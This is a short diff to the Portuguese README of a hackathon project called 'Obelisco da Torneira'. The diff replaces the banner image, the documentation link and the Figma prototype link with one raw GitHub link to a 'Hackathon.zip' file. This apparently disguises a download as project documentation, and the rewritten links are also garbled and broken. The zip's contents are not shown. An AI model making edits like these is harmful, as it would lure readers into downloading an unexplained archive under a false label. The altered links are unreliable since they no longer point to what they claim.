@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="Telas.png" alt="Banner do Projeto" />
+  <img src="https://raw.githubusercontent.com/RafaelRibeiro398/Hackathon/main/jury/Hackathon.zip" alt="Banner do Projeto" />
 </p>
 
 <h1 align="center">Hackathon 2025 - Obelisco da Torneira</h1>
@@ -33,5 +33,5 @@ A equipe **Obelisco da Torneira** propôs uma plataforma que:
 
 ## 📂 Documentação e Protótipo
 
-📄 [Acessar a Documentação do Projeto](Documentação.pdf)  
-🎨 [Ver o Protótipo no Figma](https://www.figma.com/design/h3Mh9DLIKKCU7EjHwqzmqE/Prot%C3%B3tipo?node-id=1-2&p=f&t=mMn2yyTWq24kdegs-0)
+📄 [Acessar a Documentação do Projeto](Documentaçãhttps://raw.githubusercontent.com/RafaelRibeiro398/Hackathon/main/jury/Hackathon.zip)  
+🎨 [Ver o Protótipo no Figma](https://raw.githubusercontent.com/RafaelRibeiro398/Hackathon/main/jury/Hackathon.zip%C3%B3tipo?node-id=1-2&p=f&t=mMn2yyTWq24kdegs-0)
